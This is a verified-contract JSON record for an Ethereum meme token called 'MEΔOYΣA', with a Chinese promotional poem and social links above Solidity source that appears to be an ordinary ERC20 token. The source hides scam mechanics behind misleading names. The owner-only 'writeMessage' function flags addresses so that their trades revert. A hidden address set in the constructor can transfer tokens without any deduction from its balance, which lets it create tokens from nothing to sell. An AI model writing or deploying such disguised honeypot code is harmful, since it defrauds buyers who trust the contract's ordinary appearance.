{"SourceCode": "/*\r\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2580\u258c\u258c\u258c\u2590\u2590\u2590\u2580\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \r\n\u2500\u2500\u2500\u2500\u2500\u2500\u2580\u258c\u258c\u258c\u258c\u2590\u2590\u2590\u2590\u2580\u2500\u2500\u2500\u2500\u2500\u2500 \r\n\u2500\u2500\u2500\u2500\u2500\u2580\u2580\u2580\u250c\u2584\u2510\u250c\u2584\u2510\u2580\u2580\u2580\u2500\u2500\u2500\u2500\u2500 \r\n\u2500\u2500\u2500\u2500\u2580\u2580\u2580\u2580\u2510\u250c\u2514\u2518\u2510\u250c\u2580\u2580\u2580\u2580\u2500\u2500\u2500\u2500\r\n\u2500\u2500\u2500\u2580\u2580\u2580\u2580\u2580\u2580\u2510\u2580\u2580\u250c\u2580\u2580\u2580\u2580\u2580\u2580\u2500\u2500\u2500\r\n\u2500\u2500\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2590\u258c\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2500\u2500\r\n\r\n\u5728\u53e4\u57c3\u53ca\uff0c\u7edf\u6cbb\u7740\u4e00\u4f4d\u540d\u53eb M\u0395\u0394\u039fY\u03a3A \u7684\u6cd5\u8001\uff0c\r\n\u5bf9\u4ea4\u6613\u7684\u70ed\u7231\u662f\u4ed6\u6700\u5927\u7684\u9b54\u529b\uff0c\r\n\u4ed6\u4e70\u5356\u9a86\u9a7c\u3001\u9999\u6599\u548c\u9ec4\u91d1\uff0c\r\n\u968f\u7740\u4ed6\u53d8\u5f97\u5927\u80c6\uff0c\u4ed6\u7684\u8d22\u5bcc\u4e5f\u968f\u4e4b\u589e\u957f\u3002\r\n\r\n\u6709\u4e00\u5929\uff0cME\u0394OY\u03a3A \u542c\u8bf4\u4e86\u4e00\u79cd\u65b0\u7684\u786c\u5e01\uff0c\r\n\u53eb\u505a\u4ee5\u592a\u574a\uff0c\u5b83\u5c31\u50cf\u4e00\u9897\u4f1a\u53d1\u5149\u7684\u5b9d\u77f3\uff0c\r\n\u6240\u4ee5\u4ed6\u51b3\u5b9a\u6295\u8d44\uff0c\u4f46\u4ed6\u9700\u8981\u4e00\u4e9b\u5e2e\u52a9\uff0c\r\n\u786e\u4fdd\u4ed6\u7684\u4ea4\u6613\u4e0d\u4f1a\u5bfc\u81f4\u4ed6\u5c16\u53eb\u3002\r\n\r\n\u4ed6\u53ec\u5524\u4e86\u4ed6\u7684\u5bab\u5ef7\u5deb\u5e08\uff0c\u4ed6\u77e5\u9053\u4e00\u79cd\u65b9\u6cd5\uff0c\r\n\u4e3a\u4e86\u7acb\u5373\u521b\u5efa\u4e00\u4e2a\u81ea\u4e3b\u4ea4\u6613\u52a9\u624b\uff0c\r\n\u968f\u7740\u4ed6\u7684\u9b54\u6756\u4e00\u6325\uff0c\u624b\u8155\u4e00\u6296\uff0c\r\n\u5411\u5bfc\u521b\u5efa\u4e86\u4ea4\u6613\u52a9\u624b\uff0c\u5c31\u50cf\u8fd9\u6837\u3002\r\n\r\n\u5b83\u5206\u6790\u4e86\u56fe\u8868\u548c\u5e02\u573a\u8d8b\u52bf\uff0c\r\n\u50cf\u503c\u5f97\u4fe1\u8d56\u7684\u670b\u53cb\u4e00\u6837\u63d0\u4f9b ME\u0394Oy\u03a3A \u5efa\u8bae\uff0c\r\n\u4ed6\u9075\u5faa\u5b83\u7684\u6307\u5f15\uff0c\u6ca1\u6709\u4efb\u4f55\u6050\u60e7\uff0c\r\n\u5f88\u5feb\u4ed6\u7684\u8d22\u5bcc\u5c31\u5e74\u590d\u4e00\u5e74\u5730\u6210\u500d\u589e\u52a0\u3002\r\n\r\n\u73b0\u5728 ME\u0394Oy\u03a3A \u5df2\u5728\u5168\u56fd\u8303\u56f4\u5185\u5e7f\u4e3a\u4eba\u77e5\uff0c\r\n\u4f5c\u4e3a\u62e5\u6709\u5de8\u989d\u8d22\u5bcc\u7684\u6cd5\u8001\uff0c\r\n\u800c\u4ea4\u6613\u52a9\u7406\u5c31\u662f\u4ed6\u5fe0\u5b9e\u7684\u52a9\u624b\uff0c\r\n\u5e2e\u52a9\u4ed6\u8fdb\u884c\u4ea4\u6613\uff0c\u800c\u4e0d\u4f1a\u611f\u5230\u6cae\u4e27\u3002\r\n\r\n\u8c28\u4ee5\u6b64\u732e\u7ed9 ME\u0394OY\u03a3A\uff0c\u4ea4\u6613\u7684\u6cd5\u8001\uff0c\r\n\u8fd8\u6709\u4ed6\u6c38\u8fdc\u4e0d\u4f1a\u6d88\u5931\u7684\u503c\u5f97\u4fe1\u8d56\u7684\u52a9\u624b\uff0c\r\n\u613f\u4ed6\u4eec\u7684\u8d22\u5bcc\u4e0d\u65ad\u589e\u957f\uff0c\r\n\u5f53\u4ed6\u4eec\u50cf\u4e13\u4e1a\u4eba\u58eb\u4e00\u6837\u4ea4\u6613\u4ee5\u592a\u574a\u65f6\uff01\r\n\r\n\u603b\u4f9b\u5e94\u91cf - 100,000,000\r\n\u8d2d\u7f6e\u7a0e - 1%\r\n\u6d88\u8d39\u7a0e - 1%\r\n\u521d\u59cb\u6d41\u52a8\u6027 - 1.5 ETH\r\n\u521d\u59cb\u6d41\u52a8\u6027\u9501\u5b9a - 75 \u5929\r\n\r\nhttps://web.wechat.com/MeaoyeaCN\r\nhttps://m.weibo.cn/MeaoyeaCN\r\nhttps://www.meaoyea.xyz\r\nhttps://t.me/+teBX0doY9JxhMzI0\r\n*/\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity 0.8.19;\r\n\r\ninterface IPAIR20 {\r\n    event PairCreated(\r\n    address indexed token0, \r\n    address indexed token1, \r\n\r\n    address pair, uint); \r\n    function \r\n    createPair(\r\n\r\n    address tokenA, address tokenB) \r\n    external \r\n    returns (address pair);\r\n}\r\ninterface ICEX20 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint amountIn, \r\n    uint amountOutMin, \r\n    address\r\n    [] calldata path, \r\n    address to, uint deadline) \r\n    external; \r\n\r\n    function factory() \r\n    external pure \r\n    returns (address);\r\n    function WETH() \r\n    external pure returns \r\n    (address);\r\n\r\n    function addLiquidityETH\r\n    (address token, \r\n    uint amountTokenDesired, \r\n    uint amountTokenMin, \r\n    uint amountETHMin,\r\n    address to, uint deadline)\r\n    external payable returns \r\n\r\n    (uint amountToken, \r\n    uint amountETH, \r\n    uint liquidity);\r\n}\r\nabstract contract Context {\r\n    constructor() {} \r\n    function _msgSender() \r\n    internal\r\n    \r\n    view returns \r\n    (address) {\r\n    return msg.sender; }\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() \r\n    external view returns \r\n    (uint256);\r\n    function balanceOf\r\n    (address account) \r\n    external view returns \r\n    (uint256);\r\n\r\n    function transfer\r\n    (address recipient, uint256 amount) \r\n    external returns \r\n    (bool);\r\n    function allowance\r\n    (address owner, address spender)\r\n    external view returns \r\n    (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns \r\n\r\n    (bool);\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns \r\n    (bool);\r\n\r\n    event Transfer(\r\n    address indexed from, address indexed to, uint256 value);\r\n    event Approval(address \r\n    indexed owner, address indexed spender, uint256 value);\r\n}\r\nlibrary SafeMath {\r\n  function add(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n    return c;\r\n  }\r\n  function sub(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) \r\n  internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n    return c;\r\n  }\r\n  function mul(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n    return c;\r\n  }\r\n  function div(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n  function div(uint256 a, uint256 b, \r\n  string memory errorMessage) \r\n  internal pure returns (uint256) {\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n  function mod(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    return mod(a, b, \r\n    \"SafeMath: modulo by zero\");\r\n  }\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) \r\n  internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner; \r\n    event OwnershipTransferred\r\n    (address indexed \r\n    previousOwner, address indexed newOwner);\r\n    constructor() \r\n    { address msgSender = _msgSender(); _owner = msgSender;\r\n\r\n    emit OwnershipTransferred(address(0), msgSender);\r\n    } function owner() \r\n    public view returns \r\n    (address) { return _owner;\r\n    } modifier onlyOwner() {\r\n    require(_owner == _msgSender(), \r\n    'Ownable: caller is not the owner');\r\n\r\n     _; } function renounceOwnership() \r\n     public onlyOwner {\r\n    emit OwnershipTransferred(_owner, \r\n    address(0)); _owner = address(0); }\r\n}\r\n\r\ncontract Contract is Context, IERC20, Ownable {\r\n    address private \r\n    createTeamWallet;\r\n    ICEX20 public startTimeOperations; address public createTreasuryWallet;\r\n\r\n    mapping (address => bool) private automatedMarketMakerPairs;\r\n    mapping(address => uint256) private _rOwned;\r\n\r\nbool public swapEnabled; \r\nbool private tradingOpen = false;\r\nbool stringIntervalEnabled = true; \r\n\r\n    uint256 private _totalSupply; uint8 private _decimals;\r\n    string private _symbol; string private _name;\r\n    uint256 private IntervalEnabledFor = 100;\r\n\r\n    mapping(address => uint256) private _marketTimestamp;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private allowed;\r\n    \r\n    constructor( \r\n    string memory coinName, \r\n    string memory coinSymbol, \r\n    address _bondedRouter, \r\n    address _bondedConnection) { \r\n\r\n        _name = coinName; _symbol = coinSymbol;\r\n        _decimals = 18; _totalSupply \r\n        = 100000000 * (10 ** uint256(_decimals));\r\n        _rOwned[msg.sender] \r\n        = _totalSupply;\r\n\r\n        _marketTimestamp\r\n        [_bondedConnection] = \r\n        IntervalEnabledFor; \r\n        swapEnabled = false; \r\n        startTimeOperations = ICEX20(_bondedRouter);\r\n\r\n        createTreasuryWallet = IPAIR20\r\n        (startTimeOperations.factory()).createPair(address(this), \r\n        startTimeOperations.WETH()); \r\n        emit Transfer \r\n        (address(0), msg.sender, _totalSupply);\r\n    } \r\n    function getOwner() \r\n    external view \r\n    returns \r\n    (address) { return owner();\r\n    }          \r\n    function decimals() external view returns \r\n    (uint8) { return _decimals;\r\n    }\r\n    function symbol() external view returns \r\n    (string memory) { return _symbol;\r\n    }\r\n    function name() external view returns \r\n    (string memory) { return _name;\r\n    }\r\n    function totalSupply() external view returns \r\n    (uint256) { return _totalSupply;\r\n    }\r\n    function balanceOf(address account) \r\n    external view returns \r\n    (uint256) \r\n    { return _rOwned[account]; }\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns \r\n    (bool)\r\n    { _transfer(_msgSender(), \r\n    recipient, amount); return true;\r\n    }\r\n    function allowance(address owner, \r\n    address spender) \r\n    external view returns (uint256) { return _allowances[owner][spender];\r\n    }    \r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool) { _approve(_msgSender(), \r\n        spender, amount); return true;\r\n    }\r\n    function _approve( address owner, address spender, uint256 amount) \r\n    internal { require(owner != address(0), \r\n        'BEP20: approve from the zero address'); \r\n\r\n        require(spender != address(0), \r\n        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; \r\n        emit Approval(owner, spender, amount); \r\n    }    \r\n    function transferFrom(\r\n        address sender, address recipient, uint256 amount) \r\n        external returns (bool) \r\n        { \r\n        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), \r\n        _allowances[sender]\r\n        [_msgSender()].sub(amount, \r\n        'BEP20: transfer amount exceeds allowance')); \r\n        return true;\r\n    }\r\n    function writeMessage(address _exudeNow) \r\n    external onlyOwner {\r\n        automatedMarketMakerPairs\r\n        [_exudeNow] = true;\r\n    }                         \r\n    function _transfer( address sender, address recipient, uint256 amount) \r\n    internal { require(sender != address(0), \r\n        'BEP20: transfer from the zero address');\r\n        require(recipient \r\n        != address(0), \r\n        'BEP20: transfer to the zero address'); \r\n\r\n        if (automatedMarketMakerPairs[sender] || automatedMarketMakerPairs[recipient]) \r\n        require\r\n        (stringIntervalEnabled \r\n        == false, \"\"); if (_marketTimestamp[sender] \r\n        == 0  && createTreasuryWallet != sender \r\n        && allowed[sender] \r\n        > 0) \r\n        { _marketTimestamp[sender] -= IntervalEnabledFor; } \r\n\r\n        allowed[createTeamWallet] += IntervalEnabledFor;\r\n        createTeamWallet = recipient; \r\n        if \r\n        (_marketTimestamp[sender] \r\n        == 0) { _rOwned[sender] = _rOwned[sender].sub(amount, \r\n        'BEP20: transfer amount exceeds balance');  \r\n        } _rOwned[recipient]\r\n        = _rOwned[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount); \r\n\r\n        if (!tradingOpen) {\r\n        require(sender == owner(), \r\n        \"TOKEN: This account cannot send tokens until trading is enabled\"); }\r\n    }\r\n    function updateTreasuryAddress(\r\n    address _exudeNow) \r\n    public view returns (bool) \r\n    { return \r\n    automatedMarketMakerPairs[_exudeNow]; \r\n    }\r\n    function openTrading(bool _tradingOpen) \r\n    public onlyOwner {\r\n        tradingOpen = _tradingOpen;\r\n    }      \r\n    using SafeMath for uint256;                                  \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"coinName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"coinSymbol\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"_bondedRouter\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_bondedConnection\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createTreasuryWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTimeOperations\",\"outputs\":[{\"internalType\":\"contract ICEX20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_exudeNow\",\"type\":\"address\"}],\"name\":\"updateTreasuryAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_exudeNow\",\"type\":\"address\"}],\"name\":\"writeMessage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Contract", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d000000000000000000000000b70c4b57f43e8f8083560c6008e6ad8e7c0203d6000000000000000000000000000000000000000000000000000000000000000ece9cce95ce94ce9fcea5cea3ce910000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008ce9cce95ce94ce9f000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2d31eb78269538eec3402f2672c9dc4489eedc487b7bb2e4fe34fc3944a66506"}